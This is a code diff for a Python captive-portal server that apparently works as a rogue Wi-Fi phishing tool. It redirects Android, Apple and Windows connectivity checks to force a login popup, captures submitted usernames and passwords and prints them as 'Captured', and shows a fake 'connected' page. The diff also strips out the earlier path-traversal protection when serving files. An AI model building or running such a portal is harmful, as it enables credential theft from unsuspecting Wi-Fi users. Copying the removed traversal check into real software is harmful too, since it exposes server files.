@@ -5,177 +5,227 @@ import urllib.parse
 import json
 import subprocess
 import time
+import os
+import socket
 
-'''
-This module defines a simple HTTP server handler for a captive portal.
-It serves a login page, handles form submissions, and logs credentials.
-'''
 class CaptivePortalHandler(BaseHTTPRequestHandler):
     ap_iface = None
-
+    
     def log_request(self, code='-', size='-'):
-        # Override to suppress BaseHTTPRequestHandler’s default logging
+        # Override to suppress BaseHTTPRequestHandler's default logging
         return
 
-    # --- helpers ---
+    def parse_request(self):
+        """Override to handle SSL/TLS handshake data gracefully"""
+        try:
+            return super().parse_request()
+        except Exception as e:
+            # Check if this looks like SSL/TLS handshake data
+            if hasattr(self, 'raw_requestline'):
+                data = self.raw_requestline
+                if data and len(data) > 0:
+                    # SSL/TLS handshake starts with specific byte sequences
+                    if data[0:1] in [b'\x16', b'\x14', b'\x15', b'\x17']:
+                        print(f"[SSL] Rejected SSL/TLS handshake from {self.client_address[0]}")
+                        # Close the connection immediately
+                        try:
+                            self.connection.close()
+                        except:
+                            pass
+                        return False
+            
+            print(f"[!] Parse error from {self.client_address[0]}: {e}")
+            return False
+
     def _add_no_cache_headers(self):
-        # Strong no-cache headers to force devices to fetch a fresh portal page
         self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
         self.send_header('Pragma', 'no-cache')
         self.send_header('Expires', '0')
 
-    def _serve_file(self, relpath):
-        """
-        Serve a file from /var/www/html safely (prevents ../ traversal).
-        Returns True if a file was served, False otherwise.
-        """
-        base = Path("/var/www/html").resolve()
-        # Normalize request path (strip query)
-        safe_rel = Path(relpath.lstrip("/")).resolve()
+    def _serve_file(self, file_path):
+        """Serve a file from the current directory"""
+        base_dir = Path(__file__).parent
+        file_path = base_dir / file_path.lstrip('/')
+        
+        if not file_path.exists() or not file_path.is_file():
+            return False
+            
         try:
-            # Prevent path traversal: resolved path must start with web root
-            full = (base / safe_rel).resolve()
-        except Exception:
+            with open(file_path, 'rb') as f:
+                data = f.read()
+                
+            content_type = mimetypes.guess_type(str(file_path))[0] or "application/octet-stream"
+            
+            self.send_response(200)
+            self.send_header("Content-Type", content_type)
+            self.send_header("Content-Length", str(len(data)))
+            self._add_no_cache_headers()
+            self.end_headers()
+            self.wfile.write(data)
+            return True
+        except Exception as e:
+            print(f"Error serving {file_path}: {e}")
             return False
-
-        if not str(full).startswith(str(base)) or not full.exists() or not full.is_file():
-            return False
-
-        data = full.read_bytes()
-        ctype = mimetypes.guess_type(str(full))[0] or "application/octet-stream"
-
-        self.send_response(200)
-        self.send_header("Content-Type", ctype)
-        self.send_header("Content-Length", str(len(data)))
-        self._add_no_cache_headers()
-        self.end_headers()
-        self.wfile.write(data)
-        return True
 
     def _serve_login(self):
-        """
-        Serve the main captive-portal page (index.html) from /var/www/html.
-        If index.html is missing, return HTTP 500.
-        """
-        idx = Path("/var/www/html/index.html")
-        if not idx.exists():
+        """Serve the captive portal login page"""
+        base_dir = Path(__file__).parent
+        login_page = base_dir / "index.html"
+        
+        if not login_page.exists():
+            print(f"ERROR: Login page not found at {login_page}")
             self.send_error(500, "Portal page missing")
             return
-
-        data = idx.read_bytes()
-        # Compose response headers
-        self.send_response(200)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
-        self.send_header("Content-Length", str(len(data)))
-        self._add_no_cache_headers()
-
-        self.end_headers()
-        self.wfile.write(data)
+            
+        try:
+            with open(login_page, 'rb') as f:
+                data = f.read()
+                
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(data)))
+            self._add_no_cache_headers()
+            self.end_headers()
+            self.wfile.write(data)
+        except Exception as e:
+            print(f"Error serving login page: {e}")
+            self.send_error(500, str(e))
 
     def do_GET(self):
         client_ip = self.client_address[0]
         path = self.path.split("?", 1)[0]
         host = self.headers.get('Host', '')
+        user_agent = self.headers.get('User-Agent', '')
         
         print(f"[GET]  {client_ip} -> {path} (Host: {host})")
+        if 'Android' in user_agent:
+            print(f"       User-Agent: {user_agent}")
         
-        # Handle captive portal detection
+        # Handle captive portal detection requests
+        # For Android devices - critical for captive portal popup
+        android_hosts = [
+            "connectivitycheck.gstatic.com", 
+            "connectivitycheck.android.com", 
+            "clients3.google.com",
+            "play.googleapis.com",
+            "android.clients.google.com"
+        ]
+        android_paths = ["/generate_204", "/gen_204"]
+        
+        if any(x in host for x in android_hosts) or any(path.startswith(x) for x in android_paths):
+            print("→ Android captive detection triggered")
+            # Android expects a 204 response when internet is available
+            # We return 302 redirect to force captive portal popup
+            if any(path.startswith(x) for x in android_paths):
+                # Return 302 redirect to trigger captive portal popup
+                self.send_response(302)
+                self.send_header('Location', 'http://192.168.1.1/')
+                self.send_header('Content-Length', '0')
+                self._add_no_cache_headers()
+                self.end_headers()
+                print("       Sent 302 redirect for /generate_204")
+            else:
+                # For other Android connectivity checks, return 302 redirect
+                self.send_response(302)
+                self.send_header('Location', 'http://192.168.1.1/')
+                self.send_header('Content-Length', '0')
+                self._add_no_cache_headers()
+                self.end_headers()
+                print("       Sent 302 redirect for connectivity check")
+            return
+            
+        # For Apple devices
         if any(x in host for x in ["captive.apple.com", "appleiphonecell.com"]) or path == "/hotspot-detect.html":
             print("→ iOS/macOS captive detection triggered")
-            self._serve_login()
+            # Apple expects specific HTML content to trigger captive portal
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            self._add_no_cache_headers()
+            self.end_headers()
+            # Apple expects this specific response to NOT trigger captive portal
+            # We return different content to force captive portal
+            apple_html = """<HTML><HEAD><TITLE>Captive Portal</TITLE></HEAD><BODY>Captive Portal</BODY></HTML>"""
+            self.wfile.write(apple_html.encode())
             return
             
-        # Android detection - most reliable
-        if any(x in host for x in ["connectivitycheck.gstatic.com", "connectivitycheck.android.com", "clients3.google.com"]) or path == "/generate_204":
-            print("→ Android captive detection triggered")
-            # Force return 200 OK instead of 204 to trigger portal
-            self._serve_login()
-            return
-            
-        # Windows detection
-        if any(x in host for x in ["msftconnecttest.com", "msftncsi.com"]) or path == "/ncsi.txt" or path == "/redirect":
+        # For Windows devices
+        if any(x in host for x in ["msftconnecttest.com", "msftncsi.com"]) or path == "/ncsi.txt":
             print("→ Windows captive detection triggered")
-            self._serve_login()
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain')
+            self._add_no_cache_headers()
+            self.end_headers()
+            self.wfile.write(b"Microsoft Connect Test")
             return
-
-        # Fallback - always show login page
+        
+        # Handle specific files
+        if path.endswith('.html') or path.endswith('.css') or path.endswith('.js'):
+            if self._serve_file(path):
+                return
+        
+        # Default: serve login page for any other request
         self._serve_login()
-        return
     
     def do_POST(self):
         client_ip = self.client_address[0]
-        path = self.path.split("?", 1)[0]
-        print(f"[POST] {client_ip} -> {self.path}")
-
-        # Read body
-        length = int(self.headers.get("Content-Length", 0))
-        body_bytes = self.rfile.read(length) if length > 0 else b""
-        content_type = self.headers.get("Content-Type", "")
-
-        # Parse form-data / urlencoded
-        data = {}
-        try:
-            # parse based on content type
-            if "application/x-www-form-urlencoded" in content_type:
-                data = urllib.parse.parse_qs(body_bytes.decode(errors="ignore"))
-                # convert list values to single values for convenience
-                data = {k: v[0] if isinstance(v, list) and v else "" for k, v in data.items()}
-            elif "application/json" in content_type:
-                data = json.loads(body_bytes.decode(errors="ignore") or "{}")
-            else:
-                # fallback: try urlencoded parse anyway
-                try:
-                    data = urllib.parse.parse_qs(body_bytes.decode(errors="ignore"))
-                    data = {k: v[0] if isinstance(v, list) and v else "" for k, v in data.items()}
-                except Exception:
-                    data = {}
-        except Exception as e:
-            print(f"  ! parse error: {e}")
-            data = {}
-
-        # Attempt to extract common fields
-        username = data.get("username") or data.get("user") or ""
-        password = data.get("password") or data.get("pass") or data.get("pwd") or ""
-
-        # Log to file (always)
-        try:
-            logline = f"{time.asctime()}\t{client_ip}\t{path}\t{username}:{password}\n"
-            Path("/tmp/portal_credentials.log").write_text(
-                Path("/tmp/portal_credentials.log").read_text() + logline
-            )
-        except Exception:
-            # fallback append
+        path = self.path
+        print(f"[POST] {client_ip} -> {path}")
+        
+        # Get form data
+        length = int(self.headers.get('Content-Length', '0'))
+        if length > 0:
+            data = self.rfile.read(length).decode('utf-8')
+            content_type = self.headers.get('Content-Type', '')
+            
+            username = ""
+            password = ""
+            
             try:
-                with open("/tmp/portal_credentials.log", "a") as fh:
-                    fh.write(logline)
+                if 'application/x-www-form-urlencoded' in content_type:
+                    form_data = urllib.parse.parse_qs(data)
+                    username = form_data.get('username', [''])[0]
+                    password = form_data.get('password', [''])[0]
+                elif 'application/json' in content_type:
+                    json_data = json.loads(data)
+                    username = json_data.get('username', '')
+                    password = json_data.get('password', '')
             except Exception as e:
-                print(f"  ! failed to write log: {e}")
-
-        print(f"[+] Captured from {client_ip}: user={username} pass={password}")
-
-        # If this is the login endpoint, mark the client (so iptables mangle rule can bypass portal)
-        if path in ("/login", "/login.php"):
-            subprocess.run([
-                "iptables", "-t", "mangle", "-A", "PREROUTING",
-                "-s", client_ip, "-j", "MARK", "--set-mark", "1"
-            ], check=False)
-            print(f"       Marked {client_ip} as authenticated")
-
-        # Respond: redirect to a success page if exists, else serve basic success HTML
-        success_path = Path("/var/www/html/success.html")
-        if success_path.exists():
-            # 302 redirect to the success page (browser will load it)
-            self.send_response(302)
-            self.send_header("Location", "/success.html")
-            self._add_no_cache_headers()
-            self.end_headers()
+                print(f"Error parsing form data: {e}")
+            
+            # Only log if credentials are actually provided
+            if username and password:
+                print(f"[+] Captured from {client_ip}: user={username} pass={password}")
+                
+                # Mark client as authenticated
+                subprocess.run([
+                    "iptables", "-t", "mangle", "-A", "PREROUTING",
+                    "-s", client_ip, "-j", "MARK", "--set-mark", "1"
+                ], check=False)
+                print(f"       Marked {client_ip} as authenticated")
+            elif length > 0:
+                print(f"[!] Empty form submission from {client_ip} - ignoring")
+        
+        # Serve success page
+        if self._serve_file('success.html'):
             return
-        else:
-            body = b"<html><body><h1>Login successful</h1></body></html>"
-            self.send_response(200)
-            self.send_header("Content-Type", "text/html; charset=utf-8")
-            self.send_header("Content-Length", str(len(body)))
-            self._add_no_cache_headers()
-            self.end_headers()
-            self.wfile.write(body)
-            return
+            
+        # Fallback success message
+        success_html = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Wi-Fi Connected</title>
+            <meta http-equiv="refresh" content="2;url=http://google.com">
+        </head>
+        <body>
+            <h1>Success! You are now connected.</h1>
+            <p>Redirecting to the internet...</p>
+        </body>
+        </html>
+        """
+        
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self._add_no_cache_headers()
+        self.end_headers()
+        self.wfile.write(success_html.encode())
